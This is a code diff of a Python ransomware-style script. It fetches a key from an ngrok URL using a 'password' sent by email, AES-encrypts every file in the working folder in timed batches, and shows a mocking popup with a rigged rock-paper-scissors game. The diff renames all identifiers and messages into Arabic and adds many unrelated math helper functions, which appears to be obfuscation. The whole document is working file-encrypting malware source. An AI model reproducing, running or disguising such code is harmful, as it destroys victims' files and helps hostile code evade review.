@@ -11,202 +11,287 @@ import time
 import tkinter as tk
 from tkinter import messagebox, simpledialog
 
-mode = "active"
+_وضع = "active"
 
-def get_key_from_endpoint(random_path):
-    # Construct the key retrieval URL
-    key_url = f"https://squirrel-pet-bengal.ngrok-free.app/key/{random_path}"
+def _احصل_على_المفتاح_من_النقطة(_مسار_عشوائي):
+    _رابط_المفتاح = f"https://squirrel-pet-bengal.ngrok-free.app/key/{_مسار_عشوائي}"
     try:
-        # Fetch the key from the server
-        response = requests.get(key_url)
-        response.raise_for_status()  # Raise an error for HTTP issues
-        raw_key = response.text.strip()  # Ensure no extra spaces or newlines
-        hashed_key = hashlib.sha256(raw_key.encode()).digest()[:16]  # Derive a 16-byte key
-        messagebox.showerror("Key Retrieval Failed", "The certificate could not be retrieved. The time has passed, and the password is now invalid.")
-        return hashed_key
-    except Exception as e:
-        print(f"Failed to retrieve the key: {e}")
+        _استجابة = requests.get(_رابط_المفتاح)
+        _استجابة.raise_for_status()
+        _مفتاح_خام = _استجابة.text.strip()
+        _مفتاح_مجزأ = hashlib.sha256(_مفتاح_خام.encode()).digest()[:16]
+        messagebox.showerror("فشل استرجاع المفتاح", "لم يتم استرجاع الشهادة. انتهت المهلة، وكلمة المرور أصبحت غير صالحة.")
+        return _مفتاح_مجزأ
+    except Exception as _خطأ:
+        print(f"فشل استرجاع المفتاح: {_خطأ}")
         return None
 
-def run_vector(input_data: bytes, config_token: bytes) -> bytes:
-    nonce_seed = os.urandom(12)
-    counter_seed = b'\x00\x00\x00\x00'
-    engine_seed = nonce_seed + counter_seed
+def _تشغيل_المتجه(_بيانات_مدخلة: bytes, _رمز_التكوين: bytes) -> bytes:
+    _بذرة_العشوائية = os.urandom(12)
+    _بذرة_العداد = b'\x00\x00\x00\x00'
+    _بذرة_المحرك = _بذرة_العشوائية + _بذرة_العداد
 
-    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).encryptor()
-    output_blob = session.update(input_data) + session.finalize()
-    return nonce_seed + output_blob  # return raw binary blob
+    _جلسة = Cipher(algorithms.AES(_رمز_التكوين), modes.CTR(_بذرة_المحرك), backend=default_backend()).encryptor()
+    _كتلة_الإخراج = _جلسة.update(_بيانات_مدخلة) + _جلسة.finalize()
+    return _بذرة_العشوائية + _كتلة_الإخراج
 
-def reverse_vector(blob: bytes, config_token: bytes) -> bytes:
-    nonce = blob[:12]
-    ciphertext = blob[12:]
-    counter_seed = b'\x00\x00\x00\x00'
-    engine_seed = nonce + counter_seed
+def _عكس_المتجه(_كتلة: bytes, _رمز_التكوين: bytes) -> bytes:
+    _عشوائية = _كتلة[:12]
+    _نص_مشفر = _كتلة[12:]
+    _بذرة_العداد = b'\x00\x00\x00\x00'
+    _بذرة_المحرك = _عشوائية + _بذرة_العداد
 
-    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).decryptor()
-    return session.update(ciphertext) + session.finalize()
+    _جلسة = Cipher(algorithms.AES(_رمز_التكوين), modes.CTR(_بذرة_المحرك), backend=default_backend()).decryptor()
+    return _جلسة.update(_نص_مشفر) + _جلسة.finalize()
 
-def scan_and_patch_assets(asset_dir: str, config_token: bytes, total_duration=60.0):
-    # Step 1: Collect and shuffle files
-    file_paths = []
-    file_sizes = []
-    script_path = os.path.abspath(__file__)  # Get the absolute path of this script
+def _مسح_وتعديل_الأصول(_دليل_الأصول: str, _رمز_التكوين: bytes, _مدة_إجمالية=50.0):
+    _مسارات_الملفات = []
+    _أحجام_الملفات = []
+    _مسار_السكريبت = os.path.abspath(__file__)
 
-    for dirpath, _, assets in os.walk(asset_dir):
-        for asset in assets:
-            path = os.path.join(dirpath, asset)
-            if os.path.abspath(path) == script_path:  # Exclude this script
+    for _مسار_الدليل, _, _أصول in os.walk(_دليل_الأصول):
+        for _أصل in _أصول:
+            _مسار = os.path.join(_مسار_الدليل, _أصل)
+            if os.path.abspath(_مسار) == _مسار_السكريبت:
                 continue
-            file_paths.append(path)
-            file_sizes.append(os.path.getsize(path))  # Get file size
+            _مسارات_الملفات.append(_مسار)
+            _أحجام_الملفات.append(os.path.getsize(_مسار))
 
-    # Pair file paths with their sizes and shuffle
-    files_with_sizes = list(zip(file_paths, file_sizes))
-    random.shuffle(files_with_sizes)
+    _ملفات_مع_أحجام = list(zip(_مسارات_الملفات, _أحجام_الملفات))
+    random.shuffle(_ملفات_مع_أحجام)
 
-    total_files = len(files_with_sizes)
-    if total_files == 0:
-        print("No files found.")
+    _إجمالي_الملفات = len(_ملفات_مع_أحجام)
+    if _إجمالي_الملفات == 0:
+        print("لم يتم العثور على ملفات.")
         return
 
-    # Calculate the total size of all files
-    total_size = sum(size for _, size in files_with_sizes)
+    _إجمالي_الحجم = sum(_حجم for _, _حجم in _ملفات_مع_أحجام)
 
-    # Step 2: Process files in batches with delays
-    start_time = time.time()
-    i = 0
-    while i < total_files:
-        # Determine batch size (randomized between 2 and 5 files)
-        batch_size = random.randint(2, 5)
-        batch_files = files_with_sizes[i:i + batch_size]
-        batch_total_size = sum(size for _, size in batch_files)
+    _بداية_الوقت = time.time()
+    _i = 0
+    while _i < _إجمالي_الملفات:
+        _حجم_الدفعة = random.randint(2, 5)
+        _ملفات_الدفعة = _ملفات_مع_أحجام[_i:_i + _حجم_الدفعة]
+        _إجمالي_حجم_الدفعة = sum(_حجم for _, _حجم in _ملفات_الدفعة)
 
-        # Process the batch
-        for j, (path, size) in enumerate(batch_files, start=1):
+        for _j, (_مسار, _حجم) in enumerate(_ملفات_الدفعة, start=1):
             try:
-                with open(path, 'rb') as f:
-                    data = f.read()
-                byeBye = run_vector(data, config_token)
-                with open(path, 'wb') as f:
-                    f.write(byeBye)
-                print(f"[{i + j}/{total_files}] bye bye: {path}")
+                with open(_مسار, 'rb') as _f:
+                    _بيانات = _f.read()
+                _وداعا = _تشغيل_المتجه(_بيانات, _رمز_التكوين)
+                with open(_مسار, 'wb') as _f:
+                    _f.write(_وداعا)
+                print(f"[{_i + _j}/{_إجمالي_الملفات}] وداعا: {_مسار}")
             except Exception:
-                print(f"[{i + j}/{total_files}] Failed: {path}")
+                print(f"[{_i + _j}/{_إجمالي_الملفات}] فشل: {_مسار}")
 
-        # Update index
-        i += batch_size
+        _i += _حجم_الدفعة
 
-        # Calculate delay based on batch size and distribute over total duration
-        elapsed_time = time.time() - start_time
-        remaining_time = max(total_duration - elapsed_time, 0)
-        delay = min((batch_total_size / total_size) * total_duration, remaining_time / ((total_files - i) / batch_size + 1))
-        if i < total_files:  # Avoid delay after the last batch
-            print(f"⏳ Delaying for {delay:.2f} seconds...\n")
-            time.sleep(delay)
+        _الوقت_المستغرق = time.time() - _بداية_الوقت
+        _الوقت_المتبقي = max(_مدة_إجمالية - _الوقت_المستغرق, 0)
+        _تأخير = min((_إجمالي_حجم_الدفعة / _إجمالي_الحجم) * _مدة_إجمالية, _الوقت_المتبقي / ((_إجمالي_الملفات - _i) / _حجم_الدفعة + 1))
+        if _i < _إجمالي_الملفات:
+            print(f"⏳ تأخير لمدة {_تأخير:.2f} ثانية...\n")
+            time.sleep(_تأخير)
 
-def restore_assets(asset_dir: str, config_token: bytes):
-    script_path = os.path.abspath(__file__)  # Get the absolute path of this script
+def _استعادة_الأصول(_دليل_الأصول: str, _رمز_التكوين: bytes):
+    _مسار_السكريبت = os.path.abspath(__file__)
 
-    for dirpath, _, assets in os.walk(asset_dir):
-        for asset in assets:
-            asset_path = os.path.join(dirpath, asset)
-            if os.path.abspath(asset_path) == script_path:  # Exclude this script
+    for _مسار_الدليل, _, _أصول in os.walk(_دليل_الأصول):
+        for _أصل in _أصول:
+            _مسار_الأصل = os.path.join(_مسار_الدليل, _أصل)
+            if os.path.abspath(_مسار_الأصل) == _مسار_السكريبت:
                 continue
 
             try:
-                with open(asset_path, 'rb') as f:
-                    blob = f.read()
+                with open(_مسار_الأصل, 'rb') as _f:
+                    _كتلة = _f.read()
 
-                restored = reverse_vector(blob, config_token)
+                _مستعاد = _عكس_المتجه(_كتلة, _رمز_التكوين)
 
-                with open(asset_path, 'wb') as f:
-                    f.write(restored)
+                with open(_مسار_الأصل, 'wb') as _f:
+                    _f.write(_مستعاد)
             except Exception:
                 pass  
 
-def show_popup():
-    root = tk.Tk()
-    root.withdraw()
+def _عرض_نافذة_منبثقة(_مدة_التشفير=None):
+    _جذر = tk.Tk()
+    _جذر.withdraw()
 
-    response = messagebox.askquestion(
-        "💀 Oops... Files are bye byed!",
-        "🎉 Surprise! Your precious files are now on vacation — permanently.\n\n"
-        "But hey, I’m feeling generous today...\n"
-        "Would you like a *totally fair* chance to win them back?\n\n"
-        "Click YES to 'Play a Game'\n"
-        "Click NO to 'Lose Everything Like a Legend' 💀"
+    _رسالة = (
+        "💀 أوه لا... الملفات اختفت!\n"
+        "🎉 مفاجأة! ملفاتك الثمينة الآن في إجازة — بشكل دائم.\n\n"
+        "لكن مهلاً، أشعر بالسخاء اليوم...\n"
+        "هل ترغب في فرصة *عادلة تمامًا* لاستعادتها؟\n\n"
+        "اضغط نعم للعب لعبة\n"
+        "اضغط لا لخسارة كل شيء مثل الأسطورة 💀"
     )
+    if _مدة_التشفير is not None:
+        _رسالة += f"\n\n⏳ استغرق التشفير {_مدة_التشفير:.2f} ثانية."
 
-    if response == "yes":
-        play_game()
+    _استجابة = messagebox.askquestion("💀 أوه لا... الملفات اختفت!", _رسالة)
+
+    if _استجابة == "yes":
+        _لعب_لعبة()
     else:
-        global mode
-        mode = "restore"  # Change the mode to restore
-        messagebox.showinfo("Womp Womp..", "You chose not to play. Your files will be restored 3shan khatrak bas.")
+        global _وضع
+        _وضع = "restore"
+        messagebox.showinfo("وومب وومب..", "اخترت عدم اللعب. سيتم استعادة ملفاتك فقط لأنك عزيز علينا.")
 
-def play_game():
-    global mode  # allows us to update the global `mode`
+def _لعب_لعبة():
+    global _وضع
 
-    options = ["rock", "paper", "scissors"]
-    computer_choices = ["rock", "paper", "scissors"]  # Predefined winning choices
-    user_wins = 0
-    computer_wins = 0
+    _خيارات = ["rock", "paper", "scissors"]
+    _اختيارات_الحاسوب = ["rock", "paper", "scissors"]
+    _انتصارات_المستخدم = 0
+    _انتصارات_الحاسوب = 0
 
-    for attempt in range(1, 11):  # Limit to 10 rounds
-        if user_wins == 3 or computer_wins == 3:  # End game if either reaches 3 wins
+    for _محاولة in range(1, 11):
+        if _انتصارات_المستخدم == 3 or _انتصارات_الحاسوب == 3:
             break
 
-        user_choice = simpledialog.askstring(
-            "Rock, Paper, Scissors 🎮",
-            f"Round {attempt}:\nChoose rock, paper, or scissors:"
+        _اختيار_المستخدم = simpledialog.askstring(
+            "حجر، ورقة، مقص 🎮",
+            f"الجولة {_محاولة}:\nاختر حجر، ورقة، أو مقص:"
         )
-        if not user_choice or user_choice.lower().strip() not in options:
-            messagebox.showwarning("❌ Invalid Choice", "Please choose rock, paper, or scissors.")
+        if not _اختيار_المستخدم or _اختيار_المستخدم.lower().strip() not in _خيارات:
+            messagebox.showwarning("❌ اختيار غير صالح", "يرجى اختيار حجر، ورقة، أو مقص.")
             continue
 
-        user_choice = user_choice.lower().strip()
-        if user_choice == "rock":
-            computer_choice = computer_choices[1]  # Paper beats Rock
-        elif user_choice == "paper":
-            computer_choice = computer_choices[2]
-        elif user_choice == "scissors":
-            computer_choice = computer_choices[0]
+        _اختيار_المستخدم = _اختيار_المستخدم.lower().strip()
+        if _اختيار_المستخدم == "rock":
+            _اختيار_الحاسوب = _اختيارات_الحاسوب[1]
+        elif _اختيار_المستخدم == "paper":
+            _اختيار_الحاسوب = _اختيارات_الحاسوب[2]
+        elif _اختيار_المستخدم == "scissors":
+            _اختيار_الحاسوب = _اختيارات_الحاسوب[0]
         else:
-            computer_choice = random.choice(computer_choices)
+            _اختيار_الحاسوب = random.choice(_اختيارات_الحاسوب)
 
-        if user_choice == computer_choice:
-            messagebox.showinfo("🤝 Tie", f"Both chose {user_choice}. It's a tie!")
+        if _اختيار_المستخدم == _اختيار_الحاسوب:
+            messagebox.showinfo("🤝 تعادل", f"كلاكما اختر {_اختيار_المستخدم}. إنها تعادل!")
         else:
-            computer_wins += 1
-            messagebox.showinfo("💻 Computer Wins", f"You chose {user_choice}, computer chose {computer_choice}. Computer wins this round!")
+            _انتصارات_الحاسوب += 1
+            messagebox.showinfo("💻 الحاسوب يفوز", f"اخترت {_اختيار_المستخدم}، الحاسوب اختار {_اختيار_الحاسوب}. الحاسوب يفوز بهذه الجولة!")
 
-    if computer_wins == 3:
-        messagebox.showerror("💀 Game Over", "You lost the game. The only way to decrypt is by choosing not to play.")
+    if _انتصارات_الحاسوب == 3:
+        messagebox.showerror("💀 انتهت اللعبة", "خسرت اللعبة. الطريقة الوحيدة لفك التشفير هي اختيار عدم اللعب.")
 
-# === SYSTEM EXECUTION ===
+def _حساب_مجموع_الأرقام(_قائمة):
+    return sum(_قائمة)
+
+def _عكس_النص(_نص):
+    return _نص[::-1]
+
+def _تحقق_من_الأولية(_عدد):
+    if _عدد < 2:
+        return False
+    for _في in range(2, int(_عدد ** 0.5) + 1):
+        if _عدد % _في == 0:
+            return False
+    return True
+
+def _توليد_كلمة_مرور(_طول):
+    _أحرف = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
+    return ''.join(random.choice(_أحرف) for _ in _طول)
+
+def _حساب_المتوسط(_قائمة):
+    return sum(_قائمة) / len(_قائمة) if _قائمة else 0
+
+def _تحويل_إلى_ثنائي(_عدد):
+    return bin(_عدد)[2:]
+
+def _تحويل_إلى_عشري(_ثنائي):
+    return int(_ثنائي, 2)
+
+def _إزالة_المكرر_من_قائمة(_قائمة):
+    return list(set(_قائمة))
+
+def _دمج_القواميس(_قاموس1, _قاموس2):
+    return {**_قاموس1, **_قاموس2}
+
+def _توليد_رقم_عشوائي(_حد_أدنى, _حد_أقصى):
+    return random.randint(_حد_أدنى, _حد_أقصى)
+
+def _جمع(_عدد1, _عدد2):
+    return _عدد1 + _عدد2
+
+def _طرح(_عدد1, _عدد2):
+    return _عدد1 - _عدد2
+
+def _ضرب(_عدد1, _عدد2):
+    return _عدد1 * _عدد2
+
+def _قسمة(_عدد1, _عدد2):
+    if _عدد2 == 0:
+        raise ValueError("لا يمكن القسمة على الصفر")
+    return _عدد1 / _عدد2
+
+def _رفع_إلى_القوة(_أساس, _أس):
+    return _أساس ** _أس
+
+def _جذر_تربيعي(_عدد):
+    if _عدد < 0:
+        raise ValueError("لا يمكن حساب الجذر التربيعي لعدد سالب")
+    return _عدد ** 0.5
+
+def _حساب_النسبة_المئوية(_جزء, _كل):
+    if _كل == 0:
+        raise ValueError("لا يمكن القسمة على الصفر")
+    return (_جزء / _كل) * 100
+
+def _حساب_المعاملات_المثلثية(_زاوية, _دالة):
+    import math
+    _زاوية_بالراديان = math.radians(_زاوية)
+    if _دالة == "sin":
+        return math.sin(_زاوية_بالراديان)
+    elif _دالة == "cos":
+        return math.cos(_زاوية_بالراديان)
+    elif _دالة == "tan":
+        return math.tan(_زاوية_بالراديان)
+    else:
+        raise ValueError("دالة مثلثية غير معروفة")
+
+def _حساب_المعاملات_العكسية(_قيمة, _دالة):
+    import math
+    if _دالة == "asin":
+        return math.degrees(math.asin(_قيمة))
+    elif _دالة == "acos":
+        return math.degrees(math.acos(_قيمة))
+    elif _دالة == "atan":
+        return math.degrees(math.atan(_قيمة))
+    else:
+        raise ValueError("دالة عكسية غير معروفة")
+
+def _حساب_اللوغاريتم(_عدد, _أساس=10):
+    import math
+    if _عدد <= 0:
+        raise ValueError("العدد يجب أن يكون أكبر من الصفر")
+    return math.log(_عدد, _أساس)
+
 if __name__ == "__main__":
     import time
-    resources_folder = os.getcwd()  # Use the current folder as the target folder
+    _مجلد_الموارد = os.getcwd()
 
-    root = tk.Tk()
-    root.withdraw()  # Hide the main tkinter window
+    _جذر = tk.Tk()
+    _جذر.withdraw()
 
-    random_path = simpledialog.askstring("Input Required", "Enter the random path (password) provided in the email:")
+    _مسار_عشوائي = simpledialog.askstring("إدخال مطلوب", "أدخل المسار العشوائي (كلمة المرور) المرسل في البريد الإلكتروني:")
 
-    # Retrieve the key using the provided random path
-    key = get_key_from_endpoint(random_path)
-    print(key)
-    if not key:
-        messagebox.showerror("Error", "Failed to retrieve the key. Please check your random path.")
+    _مفتاح = _احصل_على_المفتاح_من_النقطة(_مسار_عشوائي)
+    print(_مفتاح)
+    if not _مفتاح:
+        messagebox.showerror("خطأ", "فشل استرجاع المفتاح. يرجى التحقق من المسار العشوائي.")
         exit(1)
 
-    if mode == "active":
-        start = time.time()
-        scan_and_patch_assets(resources_folder, key)
-        end = time.time()
-        print(f"bye bye finished in {end - start:.2f} seconds.")
-        show_popup()  # ← may change mode to "restore"
+    if _وضع == "active":
+        _بداية = time.time()
+        _مسح_وتعديل_الأصول(_مجلد_الموارد, _مفتاح)
+        _نهاية = time.time()
+        _مدة_التشفير = _نهاية - _بداية
+        print(f"انتهى التشفير في {_مدة_التشفير:.2f} ثانية.")
+        _عرض_نافذة_منبثقة(_مدة_التشفير)
 
-    if mode == "restore":
-        restore_assets(resources_folder, key)
-        print("Files restored successfully.")
+    if _وضع == "restore":
+        _استعادة_الأصول(_مجلد_الموارد, _مفتاح)
+        print("تم استعادة الملفات بنجاح.")
